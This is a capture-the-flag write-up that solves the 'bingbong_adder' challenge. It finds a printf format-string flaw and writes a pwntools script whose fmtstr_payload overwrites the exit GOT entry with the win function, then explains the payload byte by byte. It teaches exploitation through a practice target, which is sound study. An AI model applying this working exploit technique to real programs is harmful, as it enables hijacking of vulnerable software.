# bingbong_adder

> Adding bings to bongs since 1999

Provided: [`bingbong_adder`](bingbong_adder)

## Solution

As always, let's start out by checking out some information about our binary:

```shell
$ file bingbong_adder
bingbong_adder: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=994981702729bd972ae6c827ce1c509ffe4f9974, not stripped
$ pwn checksec bingbong_adder
[*] '/path/to/bingbong_adder'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we have a 64-bit binary with stack canaries and partial RELRO enabled.
Stack canaries actually don't matter all that much for this challenge, but the fact that we have partial RELRO means that we can overwrite entries in the Global Offset Table (GOT), specifically for functions in the Procedure Linkage Table (PLT).
Yes that's a lot of acronyms :)

To my understanding, the PLT contains some assembly instructions that jump to specific locations that are outlined in the GOT.
You can use `objdump` to inspect the contents of the `.plt` section of the `bingbong_adder` binary (or any other one for that matter):

```shell
$ objdump -M intel --disassemble bingbong_adder
# --snip--
Disassembly of section .plt:

0000000000400610 <.plt>:
  400610:	ff 35 f2 09 20 00    	push   QWORD PTR [rip+0x2009f2]        # 601008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400616:	ff 25 f4 09 20 00    	jmp    QWORD PTR [rip+0x2009f4]        # 601010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40061c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000400620 <puts@plt>:
  400620:	ff 25 f2 09 20 00    	jmp    QWORD PTR [rip+0x2009f2]        # 601018 <puts@GLIBC_2.2.5>
  400626:	68 00 00 00 00       	push   0x0
  40062b:	e9 e0 ff ff ff       	jmp    400610 <.plt>

0000000000400630 <fread@plt>:
  400630:	ff 25 ea 09 20 00    	jmp    QWORD PTR [rip+0x2009ea]        # 601020 <fread@GLIBC_2.2.5>
  400636:	68 01 00 00 00       	push   0x1
  40063b:	e9 d0 ff ff ff       	jmp    400610 <.plt>

# (more functions that I don't feel like showing :))
```

Based on [this article by Red Hat](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro), the addresses of different functions in the GOT are normally populated as they're called during a program's execution.
The same article then mentions the following:

> Lastly, and more importantly, because the GOT is lazily bound it needs to be writable.

We can confirm this by running `vmmap` in pwndbg when debugging the binary:

```shell
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r-xp     1000      0 /home/stone/OSUSEC/ctf-league/bingbong_adder/bingbong_adder
          0x600000           0x602000 rw-p     2000      0 /home/stone/OSUSEC/ctf-league/bingbong_adder/bingbong_adder # <-- this is where the GOT is located, note the `w` permission
```

That means that if we can write to arbitrary locations in memory, we can overwrite the GOT address of any function with whatever we want to execute another function instead.

How might we go about that arbitrary writing though?
Well, first let's check out all of the functions in the binary itself:

```shell
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004005f0  _init
0x0000000000400620  puts@plt
0x0000000000400630  fread@plt
0x0000000000400640  write@plt
0x0000000000400650  __stack_chk_fail@plt
0x0000000000400660  printf@plt
0x0000000000400670  fgets@plt
0x0000000000400680  fopen@plt
0x0000000000400690  atoi@plt
0x00000000004006a0  exit@plt
0x00000000004006b0  _start
0x00000000004006e0  _dl_relocate_static_pie
0x00000000004006f0  deregister_tm_clones
0x0000000000400720  register_tm_clones
0x0000000000400760  __do_global_dtors_aux
0x0000000000400790  frame_dummy
0x0000000000400797  greet
0x00000000004007b6  get_input # <----
0x0000000000400838  win # <----
0x00000000004008b0  main # <----
0x0000000000400920  __libc_csu_init
0x0000000000400990  __libc_csu_fini
0x0000000000400994  _fini
```

I've marked the interesting ones with arrows :)
Obviously the `win` function probably gives us the flag, so let's check out the disassembly of `get_input`:

```shell
pwndbg> disass get_input
Dump of assembler code for function get_input:
   0x00000000004007b6 <+0>:	push   rbp
   0x00000000004007b7 <+1>:	mov    rbp,rsp
   0x00000000004007ba <+4>:	sub    rsp,0x90
   0x00000000004007c1 <+11>:	mov    rax,QWORD PTR fs:0x28 # looks like a stack canary :)
   0x00000000004007ca <+20>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007ce <+24>:	xor    eax,eax
   0x00000000004007d0 <+26>:	mov    rdx,QWORD PTR [rip+0x200899]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x00000000004007d7 <+33>:	lea    rax,[rbp-0x80] # this is our buffer
   0x00000000004007db <+37>:	mov    esi,0x69
   0x00000000004007e0 <+42>:	mov    rdi,rax
   0x00000000004007e3 <+45>:	call   0x400670 <fgets@plt> # this is where our input is actually read
   0x00000000004007e8 <+50>:	lea    rdi,[rip+0x21b]        # 0x400a0a
   0x00000000004007ef <+57>:	mov    eax,0x0
   0x00000000004007f4 <+62>:	call   0x400660 <printf@plt>
   0x00000000004007f9 <+67>:	lea    rax,[rbp-0x80] # buffer again
   0x00000000004007fd <+71>:	mov    rdi,rax # buffer is the first argument to `printf` (!)
   0x0000000000400800 <+74>:	mov    eax,0x0
   0x0000000000400805 <+79>:	call   0x400660 <printf@plt>
   0x000000000040080a <+84>:	lea    rax,[rbp-0x80]
   0x000000000040080e <+88>:	mov    rdi,rax
   0x0000000000400811 <+91>:	call   0x400690 <atoi@plt>
   0x0000000000400816 <+96>:	mov    DWORD PTR [rbp-0x84],eax
   0x000000000040081c <+102>:	mov    eax,DWORD PTR [rbp-0x84]
   0x0000000000400822 <+108>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000400826 <+112>:	xor    rcx,QWORD PTR fs:0x28 # stack canary check :)
   0x000000000040082f <+121>:	je     0x400836 <get_input+128>
   0x0000000000400831 <+123>:	call   0x400650 <__stack_chk_fail@plt>
   0x0000000000400836 <+128>:	leave
   0x0000000000400837 <+129>:	ret
End of assembler dump.
```

I've annotated it with some comments to explain what's happening (the addresses were already there though).
The most interesting thing about `get_input` is that `printf` is directly called on our input, rather than doing something like `printf("%s", input);`.
This makes it so that we can provide an arbitrary format string as input, which allows us to do some funky stuff :)
To verify that this is actually the case, we can just spam `%p` format specifiers, which treat every argument in the registers and on the stack as pointers:

```shell
$ ./bingbong_adder
I'm bored so I made a program that adds two inputs together.
Just enter your first number here
%p %p %p %p %p %p %p %p %p %p %p
Here's your input: 0x7fffba34f680 (nil) (nil) 0x12c36d1 0x410 0x7f4914ca2688 0x7f4914c9e420 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025
And your second number here
```

Yep, it's definitely treating our input as a format string :)
You might also notice that the byte sequence `0x702520` starts repeating at the 8th "address;" that corresponds to the string `%p` with a trailing space, which as it turns out is exactly what we typed in for our input.
From that, then, we know that our buffer "starts" at the 8th pointer argument to that specific `printf` call.
As it turns out, the people who wrote `printf` also decided that the `%n` format specifier should exist, which writes the number of characters that have been written to the screen to an address argument supplied to `printf`.
We can actually get a pretty easy segfault this way with the challenge binary by trying to write to a null pointer (`(nil)` from above) :)

```shell
$ ./bingbong_adder
I'm bored so I made a program that adds two inputs together.
Just enter your first number here
%n %n
Segmentation fault (core dumped)
```

Obviously segfaults aren't super useful, but we know from a couple paragraphs back that our buffer starts at the 8th argument to `printf`, so if we craft our input in a specific way we could actually write to arbitrary addresses by "including" them in our buffer.
`printf` also allows you to specify an argument offset for any format specifier, so instead of spamming `%p`s to get to our buffer you can just write `%8$p` instead:

```shell
$ ./bingbong_adder
I'm bored so I made a program that adds two inputs together.
Just enter your first number here
AAAAAAAA %8$p
Here's your input: AAAAAAAA 0x4141414141414141
```

While we could figure out the format string we'd need to overwrite specific addresses manually, luckily for us pwntools has the [`fmtstr`](https://docs.pwntools.com/en/stable/fmtstr.html) module which automates that process for us.
We just have to provide it a set of addresses and corresponding values to overwrite them with, and pwntools handles the format string creation process.

In my [solve script](add_flag.py), I ended up overwriting the GOT entry for the `exit` function with the `win` function address, since the former is called at the end of `main` anyways.
Here's my actual solve script:

```python
from pwn import *

# found by spamming As and then %p to determing our buffer offset from printf's perspective
offset = 8

if __name__ == "__main__":
    context.log_level = "error"

    binary = ELF("./bingbong_adder")
    context.binary = binary # handles architecture/endianness/???

    # io = process("./bingbong_adder")
    io = remote("chal.ctf-league.osusec.org", 1319)

    # overwrite the GOT entry for exit() with the address of the win() function
    # (exit is called at the end of main, so we just redirect it to win >:))
    got_overwrite = {
        binary.got["exit"]: binary.symbols["win"]
    }

    payload = fmtstr_payload(offset, got_overwrite)
    print("Payload:", payload)

    # send payload & other random string as "numbers"
    io.sendlineafter(b"here\n", payload)
    io.sendlineafter(b"here\n", b"no <3")

    # flag!
    io.recvlines(2) # skip "your input was" & answer lines
    print(io.recvuntil(b"}").decode())
```

Of course, running it does indeed give you the flag :)

```shell
$ python add_flag.py
Payload: b'%2104c%11$lln%8c%12$hhnaX\x10`\x00\x00\x00\x00\x00Z\x10`\x00\x00\x00\x00\x00'
flag{f0rm47_my_b1n6b0n6_pl5}
```

And there's our flag!

I'm not done writing yet though!
I figured I'd try to reason through what the format string is actually doing, since it looks more like a keyboard smash than anything :)

Here's what each format specifier ends up doing:

- `%2104c` - writes 2104 characters to the string (padded with spaces)
- `%11$lln` - writes 2104 as a `long long` (the `ll` in the format string) to the address located at offset 11, which is the string ``X\x10`\x00\x00\x00\x00\x00``, which when treated as an address is 0x601058 (the GOT address for `exit`)
- `%8c` - writes 8 more characters to the string (again padded with spaces)
- `%12$hhn` - writes 2104 + 8 = 2112 as a `signed char` (i.e. a single byte) to the address 0x60105a (corresponding to the string ``Z\x10`\x00\x00\x00\x00\x00``)

At first I was confused why it was doing two writes, but as it turns out this does in fact get you the right result.
The first write clears all of the upper bits of the GOT entry since 2104 is written as a `long long` (i.e. a 64-bit integer).
The second one is more interesting since it's offset by 2 bytes from the first write.
The conversion to a `signed char` also truncates off the top bits of 2112, meaning that it effectively just writes 64.
Due to the 2 byte offset though, the 64 written is effectively `0x400000`.
This makes it so that the number contained in the GOT address are in fact `0x400838`, just like we intended.

If it helps, here's a visualization of the binary representations of the target value and what gets written with each `%n` format specifier:

```python
>>> for n in [0x400838, 2104, (2112 & 0x7f) << 16]:
...     print(f"{n:0>64b} ({n})")
...
0000000000000000000000000000000000000000010000000000100000111000 (4196408)
0000000000000000000000000000000000000000000000000000100000111000 (2104)
0000000000000000000000000000000000000000010000000000000000000000 (4194304)
```

The `& 0x7f` and `<< 16` represent the truncation to a `signed char` and the 2 byte offset, respectively.

You might notice that the bits line up exactly with the target value, which is why this ends up working :)
In hindsight I guess it wouldn't really make sense to write 0x400838 (4196408 in decimal) characters to the screen, or at least it would take a while, so this way is much faster compared to that.

Anyways tangent over :)
Hopefully that last explanation bit was interesting (or at least made sense haha).
Now we can be content with the knowledge that `bingbong_adder` can not only add, but it can also bingbong :)